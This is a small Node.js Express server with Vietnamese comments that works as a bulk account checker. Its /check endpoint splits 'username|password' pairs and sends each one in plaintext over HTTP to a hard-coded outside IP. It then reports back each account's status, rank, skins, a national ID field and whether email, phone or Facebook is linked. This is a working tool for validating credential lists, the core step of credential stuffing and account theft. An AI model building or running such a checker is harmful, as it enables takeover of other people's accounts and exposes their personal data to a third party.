const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// API endpoint để kiểm tra tài khoản
app.post('/check', async (req, res) => {
  const { accounts } = req.body; // nhận mảng tài khoản (username|password)

  if (!accounts || accounts.length === 0) {
    return res.status(400).json({ error: 'Vui lòng cung cấp tài khoản để kiểm tra.' });
  }

  try {
    // Duyệt qua mỗi tài khoản và kiểm tra
    const results = [];
    for (const account of accounts) {
      const [username, password] = account.split('|');

      const response = await axios.get(`http://118.71.7.80/lq.php?account=${username}&password=${password}`);

      if (response.data && response.data.data) {
        const accountInfo = response.data.data;
        results.push({
          username,
          password,
          status: accountInfo.status_acc,
          level: accountInfo.cấp,
          rank: accountInfo.rank,
          skin: accountInfo.skin,
          regtime: accountInfo.regtime,
          quanhuy: accountInfo.quanhuy,
          cmnd: accountInfo.cmnd,
          email: accountInfo.email ? 'Yes' : 'No',
          mobile: accountInfo.mobile ? 'Yes' : 'No',
          facebook: accountInfo.facebook ? 'Yes' : 'No',
        });
      } else {
        results.push({
          username,
          password,
          error: 'Không tìm thấy thông tin tài khoản.',
        });
      }
    }

    // Trả kết quả
    res.json({ results });
  } catch (error) {
    res.status(500).json({ error: 'Lỗi trong quá trình kiểm tra tài khoản.' });
  }
});

// Khởi động server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
